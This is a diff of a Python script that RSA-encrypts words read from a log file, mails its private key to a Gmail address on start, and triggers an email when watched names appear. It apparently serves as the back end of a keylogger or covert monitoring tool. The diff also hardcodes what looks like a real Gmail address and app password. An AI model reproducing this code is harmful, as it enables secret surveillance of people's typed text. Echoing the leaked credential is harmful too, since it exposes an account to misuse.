@@ -9,8 +9,8 @@ publicKey, privateKey = rsa.newkeys(512)
 word_list = ["arun","shine","hemanth","yerri"]
 def startmail():
 
-    email_sender = '#mailid'
-    email_password = '#password'
+    email_sender = 'arunjakkula2044@gmail.com'
+    email_password = 'mmyg dsxm gueo obrf'
     email_receiver = 'arunjakkula2044@gmail.com'
     subject = 'The code has been started '
     body = "here goes your private key  :  /n" + str(privateKey)
@@ -37,6 +37,7 @@ def read():
 
                 # reading each word
                 for word in line.split():
+                   b = word + " "
                    if word == "end":
                        with open("log.txt", 'w') as file:
                            file.write("")
@@ -45,9 +46,9 @@ def read():
                            if word == a:
                                sendmail()
 
-                       encMessage = rsa.encrypt(word.encode(),publicKey)
-                       with open("log1.txt", "a") as file:
-                           file.write(str(encMessage))
+                   encMessage = rsa.encrypt(b.encode(),publicKey)
+                   with open("log1.txt", "a") as file:
+                        file.write(str(encMessage))
 
 def sendmail():
     email_sender = 'arunjakkula2044@gmail.com'
